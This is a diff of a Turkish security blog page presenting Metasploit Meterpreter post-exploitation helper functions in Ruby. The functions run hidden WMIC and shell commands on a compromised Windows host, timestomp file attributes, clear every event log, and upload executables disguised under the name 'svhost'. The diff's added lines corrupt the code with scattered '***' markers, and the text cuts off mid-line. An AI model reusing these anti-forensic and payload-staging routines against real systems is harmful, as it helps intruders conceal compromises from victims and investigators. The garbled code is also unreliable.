@@ -12,7 +12,7 @@
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
 <title>MSF Meterpreter Script Fonksiyonlar – Siberoloji</title>
   <meta name="description" content=" Kullanışlı Fonksiyonlar Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
-Kullanılabilir WMIC Komutları def wmicexec(session,wmiccmds= nil) windr = &#39;&#39; tmpout = &#39;&#39; windrtmp = &#34;&#34; session.response_timeout=120 begin tmp = session.fs.file.expand_path(&#34;%TEMP%&#34;) wmicfl = tmp &#43; &#34;&#34;&#43; sprintf(&#34;%.5d&#34;,rand(100000)) wmiccmds.each do |wmi| print_status &#34;running command wmic #{wmi}&#34; cmd = &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34; opt = &#34;/append:#{wmicfl} #{wmi}&#34; r = session.sys.process.execute( cmd, opt,{&#39;Hidden&#39; =&gt; true}) sleep(2) #Making sure that wmic finnishes before executing next wmic command prog2check = &#34;wmic.exe&#34; found = 0 while found == 0 session.sys.process.get_processes().each do |x| found =1 if prog2check == (x[&#39;name&#39;].downcase) sleep(0.5) print_line &#34;.&#34; found = 0 end end end r.close end # Read the output file of the wmic commands wmioutfile = session.fs.file.new(wmicfl, &#34;rb&#34;) until wmioutfile.eof? tmpout &gt;&gt; wmioutfile.read end wmioutfile.close rescue ::Exception =&gt; e print_status(&#34;Error running WMIC commands: #{e.class} #{e}&#34;) end # We delete the file with the wmic command output. c = session.sys.process.execute(&#34;cmd.exe /c del #{wmicfl}&#34;, nil, {&#39;Hidden&#39; =&gt; true}) c.close tmpout end Dosyaların MAC Zamanlarını Değiştirme def chmace(session,cmds) windir = &#39;&#39; windrtmp = &#34;&#34; print_status(&#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;) windir = session.fs.file.expand_path(&#34;%WinDir%&#34;) cmds.each do |c| begin session.core.use(&#34;priv&#34;) filetostomp = windir &#43; &#34;system32&#34;&#43; c fl2clone = windir &#43; &#34;system32chkdsk.exe&#34; print_status(&#34;tChanging file MACE attributes on #{filetostomp}&#34;) session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone) rescue ::Exception =&gt; e print_status(&#34;Error changing MACE: #{e.class} #{e}&#34;) end end end UAC Kontrolü def checkuac(session) uac = false begin winversion = session.sys.config.sysinfo if winversion[&#39;OS&#39;]=~ /Windows Vista/ or winversion[&#39;OS&#39;]=~ /Windows 7/ print_status(&#34;Checking if UAC is enaled ...&#34;) key = &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39; root_key, base_key = session.sys.registry.splitkey(key) value = &#34;EnableLUA&#34; open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ) v = open_key.query_value(value) if v.data == 1 uac = true else uac = false end open_key.close_key(key) end rescue ::Exception =&gt; e print_status(&#34;Error Checking UAC: #{e.class} #{e}&#34;) end return uac end Tüm Olay Loglarını Temizleme def clrevtlgs(session) evtlogs = [ &#39;security&#39;, &#39;system&#39;, &#39;application&#39;, &#39;directory service&#39;, &#39;dns server&#39;, &#39;file replication service&#39; ] print_status(&#34;Clearing Event Logs, this will leave and event 517&#34;) begin evtlogs.each do |evl| print_status(&#34;tClearing the #{evl} Event Log&#34;) log = session.sys.eventlog.open(evl) log.clear end print_status(&#34;Alll Event Logs have been cleared&#34;) rescue ::Exception =&gt; e print_status(&#34;Error clearing Event Log: #{e.class} #{e}&#34;) end end Bir Komut Listesini Çalıştırma def list_exec(session,cmdlst) if cmdlst.kind_of? String cmdlst = cmdlst.to_a end print_status(&#34;Running Command List ...&#34;) r=&#39;&#39; session.response_timeout=120 cmdlst.each do |cmd| begin print_status &#34;trunning command #{cmd}&#34; r = session.sys.process.execute(cmd, nil, {&#39;Hidden&#39; =&gt; true, &#39;Channelized&#39; =&gt; true}) while(d = r.channel.read) print_status(&#34;t#{d}&#34;) end r.channel.close r.close rescue ::Exception =&gt; e print_error(&#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;) end end end Dosyaları Karşı Tarafa Yükleme def upload(session,file,trgloc = nil) if not ::File.exists?(file) raise &#34;File to Upload does not exists!&#34; else if trgloc == nil location = session.fs.file.expand_path(&#34;%TEMP%&#34;) else location = trgloc end begin if file =~ /S*(.exe)/i fileontrgt = &#34;#{location}svhost#{rand(100)}.exe&#34; else fileontrgt = &#34;#{location}TMP#{rand(100)}&#34; end print_status(&#34;Uploadingd #{file}....&#34;) session.fs.file.upload_file(&#34;#{fileontrgt}&#34;,&#34;#{file}&#34;) print_status(&#34;#{file} uploaded!&#34;) print_status(&#34;#{fileontrgt}&#34;) rescue ::Exception =&gt; e print_status(&#34;Error uploading file #{file}: #{e.class} #{e}&#34;) end end return fileontrgt end Bir Dosyaya Veri Yazma def filewrt(file2wrt, data2wrt) output = ::File.open(file2wrt, &#34;a&#34;) data2wrt.each_line do |d| output.puts(d) end output.close end " /><link rel="canonical" href="http://localhost:1313/tr/msf-meterpreter-script-fonksiyonlar/" itemprop="url" />
+Kullanılabilir WMIC Komutları def wmicexec***(*** session,wmiccmds***=*** nil***)*** windr ***=*** &#39;&#39; tmpout ***=*** &#39;&#39; windrtmp ***=*** &#34;&#34; session.response_timeout***=*** 120 begin tmp ***=*** session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** wmicfl ***=*** tmp &#43; &#34;&#34;&#43; sprintf***(*** &#34;%.5d&#34;,rand***(*** 100000***))*** wmiccmds.each ***do*** |wmi| print_status &#34;running command wmic #{wmi}&#34; cmd ***=*** &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34; opt ***=*** &#34;/append:#{wmicfl} #{wmi}&#34; r ***=*** session.sys.process.execute***(*** cmd, opt,***{*** &#39;Hidden&#39; ***=&gt;*** true***})*** sleep***(*** 2***)*** #Making sure that wmic finnishes before executing next wmic command prog2check ***=*** &#34;wmic.exe&#34; found ***=*** 0 ***while *** found ***==*** 0 session.sys.process.get_processes***()*** .each ***do*** |x| found ***=*** 1 ***if *** prog2check ***==*** ***(*** x[&#39;name&#39;***]*** .downcase***)*** sleep***(*** 0.5***)*** print_line &#34;.&#34; found ***=*** 0 end end end r.close end # Read the output file of the wmic commands wmioutfile ***=*** session.fs.file.new***(*** wmicfl, &#34;rb&#34;***)*** ***until *** wmioutfile.eof? tmpout ***&gt;&gt;*** wmioutfile.read end wmioutfile.close rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error running WMIC commands: #{e.class} #{e}&#34;***)*** end # We delete the file with the wmic command output. c ***=*** session.sys.process.execute***(*** &#34;cmd.exe /c del #{wmicfl}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true***})*** c.close tmpout end Dosyaların MAC Zamanlarını Değiştirme def chmace***(*** session,cmds***)*** windir ***=*** &#39;&#39; windrtmp ***=*** &#34;&#34; print_status***(*** &#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;***)*** windir ***=*** session.fs.file.expand_path***(*** &#34;%WinDir%&#34;***)*** cmds.each ***do*** |c| begin session.core.use***(*** &#34;priv&#34;***)*** filetostomp ***=*** windir &#43; &#34;system32&#34;&#43; c fl2clone ***=*** windir &#43; &#34;system32chkdsk.exe&#34; print_status***(*** &#34;tChanging file MACE attributes on #{filetostomp}&#34;***)*** session.priv.fs.set_file_mace_from_file***(*** filetostomp, fl2clone***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error changing MACE: #{e.class} #{e}&#34;***)*** end end end UAC Kontrolü def checkuac***(*** session***)*** uac ***=*** false begin winversion ***=*** session.sys.config.sysinfo ***if *** winversion[&#39;OS&#39;***]=*** ~ /Windows Vista/ or winversion[&#39;OS&#39;***]=*** ~ /Windows 7/ print_status***(*** &#34;Checking if UAC is enaled ...&#34;***)*** key ***=*** &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39; root_key, base_key ***=*** session.sys.registry.splitkey***(*** key***)*** value ***=*** &#34;EnableLUA&#34; open_key ***=*** session.sys.registry.open_key***(*** root_key, base_key, KEY_READ***)*** v ***=*** open_key.query_value***(*** value***)*** ***if *** v.data ***==*** 1 uac ***=*** true ***else *** uac ***=*** false end open_key.close_key***(*** key***)*** end rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error Checking UAC: #{e.class} #{e}&#34;***)*** end ***return *** uac end Tüm Olay Loglarını Temizleme def clrevtlgs***(*** session***)*** evtlogs ***=*** ***[*** &#39;security&#39;, &#39;system&#39;, &#39;application&#39;, &#39;directory service&#39;, &#39;dns server&#39;, &#39;file replication service&#39; ***]*** print_status***(*** &#34;Clearing Event Logs, this will leave and event 517&#34;***)*** begin evtlogs.each ***do*** |evl| print_status***(*** &#34;tClearing the #{evl} Event Log&#34;***)*** log ***=*** session.sys.eventlog.open***(*** evl***)*** log.clear end print_status***(*** &#34;Alll Event Logs have been cleared&#34;***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error clearing Event Log: #{e.class} #{e}&#34;***)*** end end Bir Komut Listesini Çalıştırma def list_exec***(*** session,cmdlst***)*** ***if *** cmdlst.kind_of? String cmdlst ***=*** cmdlst.to_a end print_status***(*** &#34;Running Command List ...&#34;***)*** r***=*** &#39;&#39; session.response_timeout***=*** 120 cmdlst.each ***do*** |cmd| begin print_status &#34;trunning command #{cmd}&#34; r ***=*** session.sys.process.execute***(*** cmd, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true, &#39;Channelized&#39; ***=&gt;*** true***})*** ***while*** ***(*** d ***=*** r.channel.read***)*** print_status***(*** &#34;t#{d}&#34;***)*** end r.channel.close r.close rescue ::Exception ***=&gt;*** e print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** end end end Dosyaları Karşı Tarafa Yükleme def upload***(*** session,file,trgloc ***=*** nil***)*** ***if *** not ::File.exists?***(*** file***)*** raise &#34;File to Upload does not exists!&#34; ***else if *** trgloc ***==*** nil location ***=*** session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** ***else *** location ***=*** trgloc end begin ***if *** file ***=*** ~ /S******* ***(*** .exe***)*** /i fileontrgt ***=*** &#34;#{location}svhost#{rand(100)}.exe&#34; ***else *** fileontrgt ***=*** &#34;#{location}TMP#{rand(100)}&#34; end print_status***(*** &#34;Uploadingd #{file}....&#34;***)*** session.fs.file.upload_file***(*** &#34;#{fileontrgt}&#34;,&#34;#{file}&#34;***)*** print_status***(*** &#34;#{file} uploaded!&#34;***)*** print_status***(*** &#34;#{fileontrgt}&#34;***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error uploading file #{file}: #{e.class} #{e}&#34;***)*** end end ***return *** fileontrgt end Bir Dosyaya Veri Yazma def filewrt***(*** file2wrt, data2wrt***)*** output ***=*** ::File.open***(*** file2wrt, &#34;a&#34;***)*** data2wrt.each_line ***do*** |d| output.puts***(*** d***)*** end output.close end " /><link rel="canonical" href="http://localhost:1313/tr/msf-meterpreter-script-fonksiyonlar/" itemprop="url" />
 
 <meta property="og:title" content="MSF Meterpreter Script Fonksiyonlar" />
 <meta property="og:description" content="
@@ -23,46 +23,46 @@ Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonk
 Kullanılabilir WMIC Komutları 
 
 
-def wmicexec(session,wmiccmds= nil)
-        windr = &#39;&#39;
-        tmpout = &#39;&#39;
-        windrtmp = &#34;&#34;
-        session.response_timeout=120
+def wmicexec***(*** session,wmiccmds***=***  nil***)*** 
+        windr ***=***  &#39;&#39;
+        tmpout ***=***  &#39;&#39;
+        windrtmp ***=***  &#34;&#34;
+        session.response_timeout***=*** 120
         begin
-                tmp = session.fs.file.expand_path(&#34;%TEMP%&#34;)
-                wmicfl = tmp &#43; &#34;&#34;&#43; sprintf(&#34;%.5d&#34;,rand(100000))
-                wmiccmds.each do |wmi|
+                tmp ***=***  session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** 
+                wmicfl ***=***  tmp &#43; &#34;&#34;&#43; sprintf***(*** &#34;%.5d&#34;,rand***(*** 100000***))*** 
+                wmiccmds.each ***do***  |wmi|
                         print_status &#34;running command wmic #{wmi}&#34;
-                        cmd = &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34;
-                        opt = &#34;/append:#{wmicfl} #{wmi}&#34;
-                        r = session.sys.process.execute( cmd, opt,{&#39;Hidden&#39; =&gt; true})
-                        sleep(2)
+                        cmd ***=***  &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34;
+                        opt ***=***  &#34;/append:#{wmicfl} #{wmi}&#34;
+                        r ***=***  session.sys.process.execute***(***  cmd, opt,***{*** &#39;Hidden&#39; ***=&gt;***  true***})*** 
+                        sleep***(*** 2***)*** 
                         #Making sure that wmic finnishes before executing next wmic command
-                        prog2check = &#34;wmic.exe&#34;
-                        found = 0
-                        while found == 0
-                                session.sys.process.get_processes().each do |x|
-                                        found =1
-                                        if prog2check == (x[&#39;name&#39;].downcase)
-                                                sleep(0.5)
+                        prog2check ***=***  &#34;wmic.exe&#34;
+                        found ***=***  0
+                        ***while *** found ***==***  0
+                                session.sys.process.get_processes***()*** .each ***do***  |x|
+                                        found ***=*** 1
+                                        ***if *** prog2check ***==***  ***(*** x[&#39;name&#39;***]*** .downcase***)*** 
+                                                sleep***(*** 0.5***)*** 
                                                             print_line &#34;.&#34;
-                                                found = 0
+                                                found ***=***  0
                                         end
                                 end
                         end
                         r.close
                 end
                 # Read the output file of the wmic commands
-                wmioutfile = session.fs.file.new(wmicfl, &#34;rb&#34;)
-                until wmioutfile.eof?
-                        tmpout &gt;&gt; wmioutfile.read
+                wmioutfile ***=***  session.fs.file.new***(*** wmicfl, &#34;rb&#34;***)*** 
+                ***until *** wmioutfile.eof?
+                        tmpout ***&gt;&gt;***  wmioutfile.read
                 end
                 wmioutfile.close
-        rescue ::Exception =&gt; e
-                print_status(&#34;Error running WMIC commands: #{e.class} #{e}&#34;)
+        rescue ::Exception ***=&gt;***  e
+                print_status***(*** &#34;Error running WMIC commands: #{e.class} #{e}&#34;***)*** 
         end
         # We delete the file with the wmic command output.
-        c = session.sys.process.execute(&#34;cmd.exe /c del #{wmicfl}&#34;, nil, {&#39;Hidden&#39; =&gt; true})
+        c ***=***  session.sys.process.execute***(*** &#34;cmd.exe /c del #{wmicfl}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;***  true***})*** 
         c.close
         tmpout
 end
@@ -72,21 +72,21 @@ end
 Dosyaların MAC Zamanlarını Değiştirme 
 
 
-def chmace(session,cmds)
-    windir = &#39;&#39;
-    windrtmp = &#34;&#34;
-    print_status(&#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;)
-    windir = session.fs.file.expand_path(&#34;%WinDir%&#34;)
-    cmds.each do |c|
+def chmace***(*** session,cmds***)*** 
+    windir ***=***  &#39;&#39;
+    windrtmp ***=***  &#34;&#34;
+    print_status***(*** &#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;***)*** 
+    windir ***=***  session.fs.file.expand_path***(*** &#34;%WinDir%&#34;***)*** 
+    cmds.each ***do***  |c|
         begin
-            session.core.use(&#34;priv&#34;)
-            filetostomp = windir &#43; &#34;system32&#34;&#43; c
-            fl2clone = windir &#43; &#34;system32chkdsk.exe&#34;
-            print_status(&#34;tChanging file MACE attributes on #{filetostomp}&#34;)
-            session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
+            session.core.use***(*** &#34;priv&#34;***)*** 
+            filetostomp ***=***  windir &#43; &#34;system32&#34;&#43; c
+            fl2clone ***=***  windir &#43; &#34;system32chkdsk.exe&#34;
+            print_status***(*** &#34;tChanging file MACE attributes on #{filetostomp}&#34;***)*** 
+            session.priv.fs.set_file_mace_from_file***(*** filetostomp, fl2clone***)*** 
 
-        rescue ::Exception =&gt; e
-            print_status(&#34;Error changing MACE: #{e.class} #{e}&#34;)
+        rescue ::Exception ***=&gt;***  e
+            print_status***(*** &#34;Error changing MACE: #{e.class} #{e}&#34;***)*** 
         end
     end
 end
@@ -96,28 +96,28 @@ end
 UAC Kontrolü 
 
 
-def checkuac(session)
-    uac = false
+def checkuac***(*** session***)*** 
+    uac ***=***  false
     begin
-        winversion = session.sys.config.sysinfo
-        if winversion[&#39;OS&#39;]=~ /Windows Vista/ or  winversion[&#39;OS&#39;]=~ /Windows 7/
-            print_status(&#34;Checking if UAC is enaled ...&#34;)
-            key = &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39;
-            root_key, base_key = session.sys.registry.splitkey(key)
-            value = &#34;EnableLUA&#34;
-            open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
-            v = open_key.query_value(value)
-            if v.data == 1
-                uac = true
-            else
-                uac = false
+        winversion ***=***  session.sys.config.sysinfo
+        ***if *** winversion[&#39;OS&#39;***]=*** ~ /Windows Vista/ or  winversion[&#39;OS&#39;***]=*** ~ /Windows 7/
+            print_status***(*** &#34;Checking if UAC is enaled ...&#34;***)*** 
+            key ***=***  &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39;
+            root_key, base_key ***=***  session.sys.registry.splitkey***(*** key***)*** 
+            value ***=***  &#34;EnableLUA&#34;
+            open_key ***=***  session.sys.registry.open_key***(*** root_key, base_key, KEY_READ***)*** 
+            v ***=***  open_key.query_value***(*** value***)*** 
+            ***if *** v.data ***==***  1
+                uac ***=***  true
+            ***else
+                *** uac ***=***  false
             end
-            open_key.close_key(key)
+            open_key.close_key***(*** key***)*** 
         end
-    rescue ::Exception =&gt; e
-        print_status(&#34;Error Checking UAC: #{e.class} #{e}&#34;)
+    rescue ::Exception ***=&gt;***  e
+        print_status***(*** &#34;Error Checking UAC: #{e.class} #{e}&#34;***)*** 
     end
-    return uac
+    ***return *** uac
 end
 
 
@@ -125,25 +125,25 @@ end
 Tüm Olay Loglarını Temizleme 
 
 
-def clrevtlgs(session)
-    evtlogs = [
+def clrevtlgs***(*** session***)*** 
+    evtlogs ***=***  ***[*** 
         &#39;security&#39;,
         &#39;system&#39;,
         &#39;application&#39;,
         &#39;directory service&#39;,
         &#39;dns server&#39;,
         &#39;file replication service&#39;
-    ]
-    print_status(&#34;Clearing Event Logs, this will leave and event 517&#34;)
+    ***]*** 
+    print_status***(*** &#34;Clearing Event Logs, this will leave and event 517&#34;***)*** 
     begin
-        evtlogs.each do |evl|
-            print_status(&#34;tClearing the #{evl} Event Log&#34;)
-            log = session.sys.eventlog.open(evl)
+        evtlogs.each ***do***  |evl|
+            print_status***(*** &#34;tClearing the #{evl} Event Log&#34;***)*** 
+            log ***=***  session.sys.eventlog.open***(*** evl***)*** 
             log.clear
         end
-        print_status(&#34;Alll Event Logs have been cleared&#34;)
-    rescue ::Exception =&gt; e
-        print_status(&#34;Error clearing Event Log: #{e.class} #{e}&#34;)
+        print_status***(*** &#34;Alll Event Logs have been cleared&#34;***)*** 
+    rescue ::Exception ***=&gt;***  e
+        print_status***(*** &#34;Error clearing Event Log: #{e.class} #{e}&#34;***)*** 
 
     end
 end
@@ -153,25 +153,25 @@ end
 Bir Komut Listesini Çalıştırma 
 
 
-def list_exec(session,cmdlst)
-    if cmdlst.kind_of? String
-        cmdlst = cmdlst.to_a
+def list_exec***(*** session,cmdlst***)*** 
+    ***if *** cmdlst.kind_of? String
+        cmdlst ***=***  cmdlst.to_a
     end
-    print_status(&#34;Running Command List ...&#34;)
-    r=&#39;&#39;
-    session.response_timeout=120
-    cmdlst.each do |cmd|
+    print_status***(*** &#34;Running Command List ...&#34;***)*** 
+    r***=*** &#39;&#39;
+    session.response_timeout***=*** 120
+    cmdlst.each ***do***  |cmd|
         begin
             print_status &#34;trunning command #{cmd}&#34;
-            r = session.sys.process.execute(cmd, nil, {&#39;Hidden&#39; =&gt; true, &#39;Channelized&#39; =&gt; true})
-            while(d = r.channel.read)
+            r ***=***  session.sys.process.execute***(*** cmd, nil, ***{*** &#39;Hidden&#39; ***=&gt;***  true, &#39;Channelized&#39; ***=&gt;***  true***})*** 
+            ***while*** ***(*** d ***=***  r.channel.read***)*** 
 
-                print_status(&#34;t#{d}&#34;)
+                print_status***(*** &#34;t#{d}&#34;***)*** 
             end
             r.channel.close
             r.close
-        rescue ::Exception =&gt; e
-            print_error(&#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;)
+        rescue ::Exception ***=&gt;***  e
+            print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** 
         end
     end
 end
@@ -181,30 +181,30 @@ end
 Dosyaları Karşı Tarafa Yükleme 
 
 
-def upload(session,file,trgloc = nil)
-    if not ::File.exists?(file)
+def upload***(*** session,file,trgloc ***=***  nil***)*** 
+    ***if *** not ::File.exists?***(*** file***)*** 
             raise &#34;File to Upload does not exists!&#34;
-        else
-        if trgloc == nil
-        location = session.fs.file.expand_path(&#34;%TEMP%&#34;)
-        else
-            location = trgloc
+        ***else
+        if *** trgloc ***==***  nil
+        location ***=***  session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** 
+        ***else
+            *** location ***=***  trgloc
         end
         begin
-            if file =~ /S*(.exe)/i
-                       fileontrgt = &#34;#{location}svhost#{rand(100)}.exe&#34;
-            else
-                    fileontrgt = &#34;#{location}TMP#{rand(100)}&#34;
+            ***if *** file ***=*** ~ /S******* ***(*** .exe***)*** /i
+                       fileontrgt ***=***  &#34;#{location}svhost#{rand(100)}.exe&#34;
+            ***else
+                    *** fileontrgt ***=***  &#34;#{location}TMP#{rand(100)}&#34;
             end
-            print_status(&#34;Uploadingd #{file}....&#34;)
-            session.fs.file.upload_file(&#34;#{fileontrgt}&#34;,&#34;#{file}&#34;)
-            print_status(&#34;#{file} uploaded!&#34;)
-            print_status(&#34;#{fileontrgt}&#34;)
-        rescue ::Exception =&gt; e
-            print_status(&#34;Error uploading file #{file}: #{e.class} #{e}&#34;)
+            print_status***(*** &#34;Uploadingd #{file}....&#34;***)*** 
+            session.fs.file.upload_file***(*** &#34;#{fileontrgt}&#34;,&#34;#{file}&#34;***)*** 
+            print_status***(*** &#34;#{file} uploaded!&#34;***)*** 
+            print_status***(*** &#34;#{fileontrgt}&#34;***)*** 
+        rescue ::Exception ***=&gt;***  e
+            print_status***(*** &#34;Error uploading file #{file}: #{e.class} #{e}&#34;***)*** 
         end
     end
-    return fileontrgt
+    ***return *** fileontrgt
 end
 
 
@@ -212,10 +212,10 @@ end
 Bir Dosyaya Veri Yazma 
 
 
-def filewrt(file2wrt, data2wrt)
-        output = ::File.open(file2wrt, &#34;a&#34;)
-        data2wrt.each_line do |d|
-                output.puts(d)
+def filewrt***(*** file2wrt, data2wrt***)*** 
+        output ***=***  ::File.open***(*** file2wrt, &#34;a&#34;***)*** 
+        data2wrt.each_line ***do***  |d|
+                output.puts***(*** d***)*** 
         end
         output.close
 end
@@ -227,15 +227,15 @@ end
 
   <meta itemprop="name" content="MSF Meterpreter Script Fonksiyonlar">
   <meta itemprop="description" content="Kullanışlı Fonksiyonlar Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
-Kullanılabilir WMIC Komutları def wmicexec(session,wmiccmds= nil) windr = &#39;&#39; tmpout = &#39;&#39; windrtmp = &#34;&#34; session.response_timeout=120 begin tmp = session.fs.file.expand_path(&#34;%TEMP%&#34;) wmicfl = tmp &#43; &#34;&#34;&#43; sprintf(&#34;%.5d&#34;,rand(100000)) wmiccmds.each do |wmi| print_status &#34;running command wmic #{wmi}&#34; cmd = &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34; opt = &#34;/append:#{wmicfl} #{wmi}&#34; r = session.sys.process.execute( cmd, opt,{&#39;Hidden&#39; =&gt; true}) sleep(2) #Making sure that wmic finnishes before executing next wmic command prog2check = &#34;wmic.exe&#34; found = 0 while found == 0 session.sys.process.get_processes().each do |x| found =1 if prog2check == (x[&#39;name&#39;].downcase) sleep(0.5) print_line &#34;.&#34; found = 0 end end end r.close end # Read the output file of the wmic commands wmioutfile = session.fs.file.new(wmicfl, &#34;rb&#34;) until wmioutfile.eof? tmpout &gt;&gt; wmioutfile.read end wmioutfile.close rescue ::Exception =&gt; e print_status(&#34;Error running WMIC commands: #{e.class} #{e}&#34;) end # We delete the file with the wmic command output. c = session.sys.process.execute(&#34;cmd.exe /c del #{wmicfl}&#34;, nil, {&#39;Hidden&#39; =&gt; true}) c.close tmpout end Dosyaların MAC Zamanlarını Değiştirme def chmace(session,cmds) windir = &#39;&#39; windrtmp = &#34;&#34; print_status(&#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;) windir = session.fs.file.expand_path(&#34;%WinDir%&#34;) cmds.each do |c| begin session.core.use(&#34;priv&#34;) filetostomp = windir &#43; &#34;system32&#34;&#43; c fl2clone = windir &#43; &#34;system32chkdsk.exe&#34; print_status(&#34;tChanging file MACE attributes on #{filetostomp}&#34;) session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone) rescue ::Exception =&gt; e print_status(&#34;Error changing MACE: #{e.class} #{e}&#34;) end end end UAC Kontrolü def checkuac(session) uac = false begin winversion = session.sys.config.sysinfo if winversion[&#39;OS&#39;]=~ /Windows Vista/ or winversion[&#39;OS&#39;]=~ /Windows 7/ print_status(&#34;Checking if UAC is enaled ...&#34;) key = &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39; root_key, base_key = session.sys.registry.splitkey(key) value = &#34;EnableLUA&#34; open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ) v = open_key.query_value(value) if v.data == 1 uac = true else uac = false end open_key.close_key(key) end rescue ::Exception =&gt; e print_status(&#34;Error Checking UAC: #{e.class} #{e}&#34;) end return uac end Tüm Olay Loglarını Temizleme def clrevtlgs(session) evtlogs = [ &#39;security&#39;, &#39;system&#39;, &#39;application&#39;, &#39;directory service&#39;, &#39;dns server&#39;, &#39;file replication service&#39; ] print_status(&#34;Clearing Event Logs, this will leave and event 517&#34;) begin evtlogs.each do |evl| print_status(&#34;tClearing the #{evl} Event Log&#34;) log = session.sys.eventlog.open(evl) log.clear end print_status(&#34;Alll Event Logs have been cleared&#34;) rescue ::Exception =&gt; e print_status(&#34;Error clearing Event Log: #{e.class} #{e}&#34;) end end Bir Komut Listesini Çalıştırma def list_exec(session,cmdlst) if cmdlst.kind_of? String cmdlst = cmdlst.to_a end print_status(&#34;Running Command List ...&#34;) r=&#39;&#39; session.response_timeout=120 cmdlst.each do |cmd| begin print_status &#34;trunning command #{cmd}&#34; r = session.sys.process.execute(cmd, nil, {&#39;Hidden&#39; =&gt; true, &#39;Channelized&#39; =&gt; true}) while(d = r.channel.read) print_status(&#34;t#{d}&#34;) end r.channel.close r.close rescue ::Exception =&gt; e print_error(&#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;) end end end Dosyaları Karşı Tarafa Yükleme def upload(session,file,trgloc = nil) if not ::File.exists?(file) raise &#34;File to Upload does not exists!&#34; else if trgloc == nil location = session.fs.file.expand_path(&#34;%TEMP%&#34;) else location = trgloc end begin if file =~ /S*(.exe)/i fileontrgt = &#34;#{location}svhost#{rand(100)}.exe&#34; else fileontrgt = &#34;#{location}TMP#{rand(100)}&#34; end print_status(&#34;Uploadingd #{file}....&#34;) session.fs.file.upload_file(&#34;#{fileontrgt}&#34;,&#34;#{file}&#34;) print_status(&#34;#{file} uploaded!&#34;) print_status(&#34;#{fileontrgt}&#34;) rescue ::Exception =&gt; e print_status(&#34;Error uploading file #{file}: #{e.class} #{e}&#34;) end end return fileontrgt end Bir Dosyaya Veri Yazma def filewrt(file2wrt, data2wrt) output = ::File.open(file2wrt, &#34;a&#34;) data2wrt.each_line do |d| output.puts(d) end output.close end">
+Kullanılabilir WMIC Komutları def wmicexec***(*** session,wmiccmds***=*** nil***)*** windr ***=*** &#39;&#39; tmpout ***=*** &#39;&#39; windrtmp ***=*** &#34;&#34; session.response_timeout***=*** 120 begin tmp ***=*** session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** wmicfl ***=*** tmp &#43; &#34;&#34;&#43; sprintf***(*** &#34;%.5d&#34;,rand***(*** 100000***))*** wmiccmds.each ***do*** |wmi| print_status &#34;running command wmic #{wmi}&#34; cmd ***=*** &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34; opt ***=*** &#34;/append:#{wmicfl} #{wmi}&#34; r ***=*** session.sys.process.execute***(*** cmd, opt,***{*** &#39;Hidden&#39; ***=&gt;*** true***})*** sleep***(*** 2***)*** #Making sure that wmic finnishes before executing next wmic command prog2check ***=*** &#34;wmic.exe&#34; found ***=*** 0 ***while *** found ***==*** 0 session.sys.process.get_processes***()*** .each ***do*** |x| found ***=*** 1 ***if *** prog2check ***==*** ***(*** x[&#39;name&#39;***]*** .downcase***)*** sleep***(*** 0.5***)*** print_line &#34;.&#34; found ***=*** 0 end end end r.close end # Read the output file of the wmic commands wmioutfile ***=*** session.fs.file.new***(*** wmicfl, &#34;rb&#34;***)*** ***until *** wmioutfile.eof? tmpout ***&gt;&gt;*** wmioutfile.read end wmioutfile.close rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error running WMIC commands: #{e.class} #{e}&#34;***)*** end # We delete the file with the wmic command output. c ***=*** session.sys.process.execute***(*** &#34;cmd.exe /c del #{wmicfl}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true***})*** c.close tmpout end Dosyaların MAC 